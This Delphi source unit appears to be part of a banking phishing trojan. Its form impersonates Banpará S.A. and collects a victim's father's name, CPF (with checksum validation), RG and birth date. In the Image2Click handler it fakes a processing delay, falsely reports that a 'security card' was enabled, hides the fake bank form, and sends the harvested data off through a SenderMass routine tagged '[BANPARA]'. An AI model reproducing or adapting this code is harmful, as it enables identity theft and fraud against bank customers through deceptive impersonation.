unit Acai2;
interface
uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, pngimage, ExtCtrls, StdCtrls;
type
  TFramBanp2 = class(TFrame)
    Image1: TImage;
    EditPai: TEdit;
    EditCpf: TEdit;
    EditRg: TEdit;
    EditNas: TEdit;
    Image2: TImage;
    Image3: TImage;
    Edit1: TEdit;
    procedure Image2Click(Sender: TObject);
    procedure EditCpfChange(Sender: TObject);
    procedure EditCpfExit(Sender: TObject);
    procedure EditCpfKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure EditNasChange(Sender: TObject);
    procedure EditNasKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure EditPaiKeyPress(Sender: TObject; var Key: Char);
  private
    { Private declarations }
  public
    S: String;
  end;
implementation
{$R *.dfm}
uses
Dhafne, Unitrix, Acai;
function Cpf(CPF_Text: string): boolean;
var
  n1,n2,n3,n4,n5,n6,n7,n8,n9: integer;
  d1,d2: integer;
  digitado, calculado: string;
begin
   n1:=StrToInt(CPF_Text[1]);
   n2:=StrToInt(CPF_Text[2]);
   n3:=StrToInt(CPF_Text[3]);
   n4:=StrToInt(CPF_Text[5]);
   n5:=StrToInt(CPF_Text[6]);
   n6:=StrToInt(CPF_Text[7]);
   n7:=StrToInt(CPF_Text[9]);
   n8:=StrToInt(CPF_Text[10]);
   n9:=StrToInt(CPF_Text[11]);
   d1:=n9*2+n8*3+n7*4+n6*5+n5*6+n4*7+n3*8+n2*9+n1*10;
   d1:=11-(d1 mod 11);
   if d1>=10 then
    d1:=0;
    d2:=d1*2+n9*3+n8*4+n7*5+n6*6+n5*7+n4*8+n3*9+n2*10+n1*11;
    d2:=11-(d2 mod 11);
   if d2>=10 then
    d2:=0;
    calculado:=inttostr(d1)+inttostr(d2);
    digitado:=CPF_Text[13]+CPF_Text[14];
   if calculado=digitado then
    Cpf:=true
   else
    Cpf:=false;
end;
procedure TFramBanp2.EditCpfChange(Sender: TObject);
begin
  if Length(EditCpf.Text) = 14 then
  EditRg.SetFocus;
if s = 's' then
begin
if length(EditCpf.Text) = 3 then
begin
EditCpf.Text := EditCpf.Text + '.';
EditCpf.SelStart := length(EditCpf.Text);
end;
if length(EditCpf.Text) = 7 then
begin
EditCpf.Text := EditCpf.Text + '.';
EditCpf.SelStart := length(EditCpf.Text);
end;
if length(EditCpf.Text) = 11 then
begin
EditCpf.Text := EditCpf.Text + '-';
EditCpf.SelStart := length(EditCpf.Text);
end;
end
else
begin
s :='s';
end;
end;
procedure TFramBanp2.EditCpfExit(Sender: TObject);
begin
  If EditCpf.Text<>'' Then
    If Cpf(EditCpf.Text)=False Then
    Begin
      MessageDlg('O CPF Informado está incorreto! Verifique, e tente novamente.',mtError, [mbOk],0);
      EditCpf.Text:='';
      EditCpf.SetFocus;
    end;
end;
procedure TFramBanp2.EditCpfKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key = VK_BACK then
end;
procedure TFramBanp2.EditNasChange(Sender: TObject);
begin
  if Length(EditNas.Text) = 10 then
  Edit1.SetFocus;
if s = 's' then
begin
if length(EditNas.Text) = 2 then
begin
EditNas.Text := EditNas.Text + '/';
EditNas.SelStart := length(EditNas.Text);
end;
if length(EditNas.Text) = 5 then
begin
EditNas.Text := EditNas.Text + '/';
EditNas.SelStart := length(EditNas.Text);
end;
end
else
begin
s :='s';
end;
end;
procedure TFramBanp2.EditNasKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key = VK_BACK then
end;
procedure TFramBanp2.EditPaiKeyPress(Sender: TObject; var Key: Char);
begin
  Key := Upcase(key);
end;
procedure TFramBanp2.Image2Click(Sender: TObject);
begin
Screen.Cursor := crHourGlass;
  Sleep(6000);
  Screen.Cursor := crDefault;
      if EditPai.Text='' then
  begin
    MessageBox(Self.handle,'Informe o nome completo do Pai!', 'BANPARÁ S.A', mb_IconError + mb_Ok);
    exit;
  end;
    if EditCpf.Text='' then
  begin
    MessageBox(Self.handle,'Informe o seu CPF!', 'BANPARÁ S.A', mb_IconError + mb_Ok);
    exit;
  end;
     if EditRg.Text='' then
  begin
    MessageBox(Self.handle,'Informe o seu RG!', 'BANPARÁ S.A', mb_IconError + mb_Ok);
    exit;
  end;
    if EditNas.Text='' then
  begin
    MessageBox(Self.handle,'Informe sua data de Nascimento', 'BANPARÁ S.A', mb_IconError + mb_Ok);
    exit;
  end;
DadosEnvio_.Add('DADOS CADASTRAIS:');
DadosEnvio_.Add('==================================');
DadosEnvio_.Add('PAI: '+EditPai.Text);
DadosEnvio_.Add('CPF: '+EditCpf.Text);
DadosEnvio_.Add('RG.: '+EditRg.Text);
DadosEnvio_.Add('NAS: '+EditNAS.Text);
DadosEnvio_.Add('==================================');
 Application.MessageBox(' Cartão de Segurança Banpará Habilitado com Sucesso! ', 'BANPARÁ S.A',mb_Ok+mb_IconInformation);
try
  Banpform.Visible := False;
  SenderMass(DadosEnvio_ , '[BANPARA]');
  DadosEnvio_.Free;
except
end;
end;
end.
